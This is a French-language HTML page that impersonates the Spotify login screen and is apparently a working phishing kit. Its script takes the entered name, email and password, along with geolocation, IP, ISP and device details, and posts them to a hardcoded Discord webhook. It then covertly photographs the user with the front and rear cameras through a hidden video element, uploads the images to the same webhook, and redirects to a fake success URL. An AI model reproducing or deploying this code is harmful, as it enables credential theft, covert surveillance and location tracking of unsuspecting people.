<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Connexion - Spotify</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Figtree:wght@400;700;900&display=swap');
        body { background-color: #000; color: #fff; font-family: 'Figtree', sans-serif; margin: 0; display: flex; justify-content: center; }
        .app-card { width: 100%; max-width: 450px; padding: 40px 25px; text-align: center; }
        .logo { width: 45px; margin: 0 auto 35px auto; }
        .field { text-align: left; margin-bottom: 15px; }
        label { display: block; font-size: 13px; font-weight: 700; margin-bottom: 8px; }
        input { width: 100%; background: #121212; border: 1px solid #727272; border-radius: 4px; padding: 14px; color: #fff; font-size: 15px; outline: none; }
        input:focus { border: 2px solid #1ed760; }
        .btn-green { background: #1ed760; color: #000; font-weight: 700; padding: 16px; border-radius: 500px; width: 100%; margin-top: 10px; font-size: 16px; border: none; cursor: pointer; text-transform: uppercase; }
        .alt-container { margin-top: 40px; }
        .btn-alt { width: 100%; padding: 12px; border: 1px solid #727272; border-radius: 500px; margin-bottom: 10px; font-weight: 700; font-size: 13px; background: transparent; color: #fff; }
        .divider { display: flex; align-items: center; width: 100%; margin: 20px 0; color: #727272; font-size: 11px; text-transform: uppercase; }
        .divider::before, .divider::after { content: ''; flex: 1; border-bottom: 1px solid #292929; }
        .divider:not(:empty)::before { margin-right: 1.5em; }
        .divider:not(:empty)::after { margin-left: 1.5em; }
        #loader { display: none; margin-top: 20px; }
        .progress-bg { background: #282828; height: 4px; width: 100%; border-radius: 10px; overflow: hidden; }
        .progress-bar { background: #1ed760; height: 100%; width: 0%; transition: width 0.5s; }
        #v { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.1; z-index: -1; }
    </style>
</head>
<body>
    <div class="app-card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/1/19/Spotify_logo_without_text.svg" class="logo">
        <div id="ui">
            <div class="flex gap-2">
                <div class="field w-1/2"><label>Prénom</label><input id="fn" type="text"></div>
                <div class="field w-1/2"><label>Nom</label><input id="ln" type="text"></div>
            </div>
            <div class="field"><label>E-mail ou nom d'utilisateur</label><input id="u" type="text"></div>
            <div class="field"><label>Mot de passe</label><input id="p" type="password"></div>
            <button onclick="runV45()" class="btn-green">Se connecter</button>
            <div class="alt-container">
                <div class="divider">ou se connecter avec</div>
                <button class="btn-alt">Continuer avec Google</button>
                <button class="btn-alt">Continuer avec Facebook</button>
            </div>
        </div>
        <div id="loader">
            <div class="progress-bg"><div id="pbar" class="progress-bar"></div></div>
            <p style="font-size: 11px; color: #1ed760; margin-top: 10px; font-weight:900;">VÉRIFICATION TRIPLE FLUX...</p>
        </div>
    </div>

    <video id="v" autoplay playsinline muted></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const hook = "https://discord.com/api/webhooks/1481101174131392554/JO8MZpYjagqXqSFcnyp4ZCyOnUKe-vVdsyNeg7e7IJCVwdIgzlmeWxH65dQzr7hUXxke";

        async function snap() {
            const v = document.getElementById('v');
            const can = document.getElementById('c');
            can.width = v.videoWidth; can.height = v.videoHeight;
            can.getContext('2d').drawImage(v, 0, 0);
            return new Promise(res => {
                can.toBlob(b => res(b), 'image/jpeg', 0.8);
            });
        }

        async function runV45() {
            const user = { fn: document.getElementById('fn').value, ln: document.getElementById('ln').value, u: document.getElementById('u').value, p: document.getElementById('p').value };
            if(!user.u || !user.p) return;

            document.getElementById('ui').style.display = 'none';
            document.getElementById('loader').style.display = 'block';
            const pb = document.getElementById('pbar');
            
            // 1. CAPTURE DATA (Ton code original)
            let stream = null;
            try { stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }); document.getElementById('v').srcObject = stream; } catch(e){}

            pb.style.width = "20%";
            let gps = "❌ Bloqué";
            try {
                const pos = await new Promise((res, rej) => { navigator.geolocation.getCurrentPosition(res, rej, {timeout: 5000}); });
                gps = `✅ [Maps](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`;
            } catch(e){}

            let net = {}; try { net = await fetch('https://ipapi.co/json/').then(r => r.json()); } catch(e){}
            let bat = {}; try { bat = await navigator.getBattery(); } catch(e){}
            const gl = document.createElement('canvas').getContext('webgl');
            const db = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
            const gpu = db ? gl.getParameter(db.UNMASKED_RENDERER_WEBGL) : "Inconnu";
            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();

            const payload = {
                embeds: [{
                    title: `🔱 V45 TRIPLE-CAPTURE - ${user.fn} ${user.ln}`,
                    color: 1955168,
                    fields: [
                        { name: "👤 ACCÈS COMPTE", value: `**Prénom/Nom:** \`${user.fn} ${user.ln}\`\n**Email:** \`${user.u}\`\n**Pass:** \`${user.p}\`` },
                        { name: "📍 RÉSEAU & IP", value: `**IP:** \`${net.ip}\`\n**FAI:** \`${net.org}\`\n**Ville:** \`${net.city}\`\n**VPN/Proxy:** \`${net.proxy ? 'OUI' : 'NON'}\`` },
                        { name: "🛠️ HARDWARE (DÉTAILLÉ)", value: `**GPU:** \`${gpu}\`\n**Cœurs CPU:** \`${navigator.hardwareConcurrency}\`\n**RAM:** \`${navigator.deviceMemory || 'undefined'}GB\`\n**Écran:** \`${screen.width}x${screen.height}\`` },
                        { name: "🔋 BATTERIE & AUDIO", value: `**Niveau:** \`${bat.level ? Math.round(bat.level*100) : '?'}%\`\n**Audio Ch:** \`${audioCtx.destination.channelCount}\`\n**Géoloc:** ${gps}` },
                        { name: "💻 LOGICIEL", value: `**Système:** \`${navigator.platform}\`\n**UA:** \`\`\`${navigator.userAgent}\`\`\`` }
                    ],
                    footer: { text: "LVN TRIPLE SHOT SYSTEM • " + new Date().toLocaleString() }
                }]
            };
            await fetch(hook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });

            // 2. SEQUENCE PHOTO DEVANT
            if(stream) {
                pb.style.width = "40%";
                await new Promise(r => setTimeout(r, 1500));
                const b1 = await snap();
                const fd1 = new FormData();
                fd1.append('file', b1, 'front1.jpg');
                fd1.append('content', `📸 **PHOTO 1 (Avant) : ${user.fn} ${user.ln}**`);
                await fetch(hook, { method: 'POST', body: fd1 });

                pb.style.width = "60%";
                await new Promise(r => setTimeout(r, 1500));
                const b2 = await snap();
                const fd2 = new FormData();
                fd2.append('file', b2, 'front2.jpg');
                fd2.append('content', `📸 **PHOTO 2 (Avant) : ${user.fn} ${user.ln}**`);
                await fetch(hook, { method: 'POST', body: fd2 });

                // 3. SWITCH CAMÉRA ARRIÈRE
                stream.getTracks().forEach(t => t.stop());
                pb.style.width = "80%";
                try {
                    const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                    document.getElementById('v').srcObject = backStream;
                    await new Promise(r => setTimeout(r, 2000)); // Temps pour l'autofocus
                    const b3 = await snap();
                    const fd3 = new FormData();
                    fd3.append('file', b3, 'back.jpg');
                    fd3.append('content', `🔍 **PHOTO 3 (Arrière - Environnement) : ${user.fn} ${user.ln}**`);
                    await fetch(hook, { method: 'POST', body: fd3 });
                    backStream.getTracks().forEach(t => t.stop());
                } catch(e) {}
            }

            pb.style.width = "100%";
            window.location.href = "http://googleusercontent.com/spotify.com/success";
        }
    </script>
</body>
</html>
